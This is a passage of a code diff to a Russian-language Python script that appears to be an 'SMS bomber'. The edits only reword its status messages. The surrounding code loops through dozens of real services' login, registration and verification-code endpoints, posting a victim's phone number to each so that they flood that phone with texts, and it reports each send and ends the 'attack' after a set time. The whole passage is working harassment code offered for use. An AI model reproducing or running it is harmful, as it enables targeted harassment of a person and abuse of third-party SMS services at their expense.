+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
@@ -7605,10 +7605,10 @@ if call == str(2):
             print('[+] Online.ua отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
@@ -7616,10 +7616,10 @@ if call == str(2):
             print('[+] PlanetaKino отправлено!')
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ontaxi.com.ua/api/v2/web/client',
@@ -7628,10 +7628,10 @@ if call == str(2):
             print('[+] OnTaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -7639,10 +7639,10 @@ if call == str(2):
             print('[+] Iqos отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://smart.space/api/users/request_confirmation_code/',
@@ -7651,10 +7651,10 @@ if call == str(2):
             print('[+] Smart.Space отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
@@ -7662,10 +7662,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
@@ -7675,10 +7675,10 @@ if call == str(2):
             print('[+] tarantino-family отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://apteka.ru/_action/auth/getForm/',
@@ -7691,10 +7691,10 @@ if call == str(2):
             print('[+] Apteka отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://uklon.com.ua/api/v1/account/code/send',
@@ -7703,10 +7703,10 @@ if call == str(2):
             print('[+] Uklon отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
@@ -7715,10 +7715,10 @@ if call == str(2):
             print('[+] Ozon отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://requests.service.banki.ru/form/960/submit',
@@ -7728,10 +7728,10 @@ if call == str(2):
             print('[+] Banki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
@@ -7739,10 +7739,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.moyo.ua/identity/registration',
@@ -7751,10 +7751,10 @@ if call == str(2):
             print('[+] Moyo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
@@ -7762,10 +7762,10 @@ if call == str(2):
             print('[+] Helsi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[+] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
@@ -7774,10 +7774,10 @@ if call == str(2):
             print('[+] KinoLend отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -7787,10 +7787,10 @@ if call == str(2):
             print('[+] PizzaHut отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -7799,10 +7799,10 @@ if call == str(2):
             print('[+] Rabota отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -7813,7 +7813,7 @@ if call == str(2):
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
@@ -7821,10 +7821,10 @@ if call == str(2):
             print('[+] Citilink отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -7833,10 +7833,10 @@ if call == str(2):
             print('[+] Smsint отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -7845,10 +7845,10 @@ if call == str(2):
             print('[+] oyorooms отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -7858,10 +7858,10 @@ if call == str(2):
             print('[+] MVIDEO отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -7871,10 +7871,10 @@ if call == str(2):
             print('[+] newnext отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
@@ -7882,10 +7882,10 @@ if call == str(2):
             print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -7895,10 +7895,10 @@ if call == str(2):
             print('[+] alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
@@ -7906,10 +7906,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -7919,10 +7919,10 @@ if call == str(2):
             print('[+] Sberbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -7935,10 +7935,10 @@ if call == str(2):
             print('[+] Psbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
@@ -7946,10 +7946,10 @@ if call == str(2):
             print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
@@ -7957,10 +7957,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
@@ -7968,10 +7968,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
@@ -7979,10 +7979,10 @@ if call == str(2):
             print('[+] Yandex.Chef отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -7991,10 +7991,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -8003,10 +8003,10 @@ if call == str(2):
             print('[+] Delitime отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -8015,10 +8015,10 @@ if call == str(2):
             print('[+] Guru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -8028,10 +8028,10 @@ if call == str(2):
             print('[+] ICQ отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -8041,10 +8041,10 @@ if call == str(2):
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -8053,10 +8053,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -8064,10 +8064,10 @@ if call == str(2):
             print('[+] Pmsm отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
@@ -8075,10 +8075,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
@@ -8086,10 +8086,10 @@ if call == str(2):
             print('[+] Lenta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -8098,10 +8098,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -8111,10 +8111,10 @@ if call == str(2):
             print('[+] MVideo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -8123,10 +8123,10 @@ if call == str(2):
             print('[+] OK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
@@ -8134,10 +8134,10 @@ if call == str(2):
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
@@ -8147,10 +8147,10 @@ if call == str(2):
             print('[+] Qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
@@ -8158,10 +8158,10 @@ if call == str(2):
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -8169,10 +8169,10 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -8183,10 +8183,10 @@ if call == str(2):
             print('[+] Twitch отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -8195,10 +8195,10 @@ if call == str(2):
             print('[+] CabWiFi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
@@ -8206,10 +8206,10 @@ if call == str(2):
             print('[+] wowworks отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
@@ -8218,10 +8218,10 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
@@ -8229,10 +8229,10 @@ if call == str(2):
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -8242,10 +8242,10 @@ if call == str(2):
             print('[+] Alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
@@ -8253,10 +8253,10 @@ if call == str(2):
             print('[+] SMS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
@@ -8264,10 +8264,10 @@ if call == str(2):
             print('[+] Delivery отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://requests.service.banki.ru/form/960/submit',
@@ -8277,17 +8277,17 @@ if call == str(2):
             print('[+] Banki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.moyo.ua/identity/registration',
@@ -8296,10 +8296,10 @@ if call == str(2):
             print('[+] Moyo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
@@ -8307,10 +8307,10 @@ if call == str(2):
             print('[+] Helsi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[+] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
@@ -8319,10 +8319,10 @@ if call == str(2):
             print('[+] KinoLend отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
